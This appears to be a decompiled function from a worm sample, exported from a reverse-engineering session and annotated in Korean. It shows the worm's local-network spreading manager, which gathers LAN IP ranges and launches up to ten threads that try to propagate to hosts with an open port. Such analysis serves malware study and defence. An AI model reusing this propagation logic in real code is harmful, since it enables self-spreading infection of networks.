// --- Metadata ---
// Function Name: collectIP_spreadWormManager_407720
// Address: 0x407720
// Exported At: 20250527_191029
// Signature: unknown_signature
// ---------------
unsigned int __stdcall collectIP_spreadWormManager_407720()
{
  unsigned int i; // edi
  void **v1; // eax
  void *v2; // esi
  char v4; // [esp+13h] [ebp-2Dh]
  char v5[4]; // [esp+14h] [ebp-2Ch] BYREF
  void *Block; // [esp+18h] [ebp-28h]
  int v7; // [esp+1Ch] [ebp-24h]
  int v8; // [esp+20h] [ebp-20h]
  char v9[4]; // [esp+24h] [ebp-1Ch] BYREF
  void *v10; // [esp+28h] [ebp-18h]
  int v11; // [esp+2Ch] [ebp-14h]
  int v12; // [esp+30h] [ebp-10h]
  int v13; // [esp+3Ch] [ebp-4h]

  v9[0] = v4;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  v13 = 1;
  v5[0] = v4;
  Block = 0;
  v7 = 0;
  v8 = 0;
  collectLocalNetworkIPRanges_409160(v9, v5);   // IP 정보 초기화 
  for ( i = 0; ; ++i )
  {
    v1 = v10;
    if ( !v10 || i >= (v11 - v10) >> 2 )
      break;
    if ( *&FileName[268] > 10 )                 // 최대 10개 동시 쓰레드 제한 
    {
      do
        Sleep(0x64u);
      while ( *&FileName[268] > 10 );
      v1 = v10;
    }
    v2 = beginthreadex(0, 0, propagateIfPortOpen_4076B0, v1[i], 0, 0);// 각 항목 별 쓰레드 생성 
    if ( v2 )
    {
      InterlockedIncrement(&FileName[268]);
      CloseHandle(v2);
    }
    Sleep(0x32u);
  }
  endthreadex(0);
  freeBlock_4097FE(Block);
  Block = 0;
  v7 = 0;
  v8 = 0;
  freeBlock_4097FE(v10);
  return 0;
}
